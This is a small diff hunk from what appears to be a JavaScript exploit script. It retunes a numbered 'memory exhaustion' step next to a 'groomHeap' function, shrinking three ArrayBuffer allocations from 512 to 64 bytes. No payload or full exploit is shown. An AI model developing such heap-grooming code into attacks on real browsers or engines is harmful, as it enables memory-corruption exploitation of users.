@@ -37,11 +37,11 @@ function groomHeap() {
 
 // Step 3: Memory Exhaustion Function
 function memExh() {
-    let a = new ArrayBuffer(512);
+    let a = new ArrayBuffer(64);
     let se_a = new Uint8Array(a); // View it as an array of bytes
-    let b = new ArrayBuffer(512);
+    let b = new ArrayBuffer(64);
     let se_b = new Uint8Array(b);
-    let c = new ArrayBuffer(512);
+    let c = new ArrayBuffer(64);
     let se_c = new Uint8Array(c);
 
     let bufferArray = [];
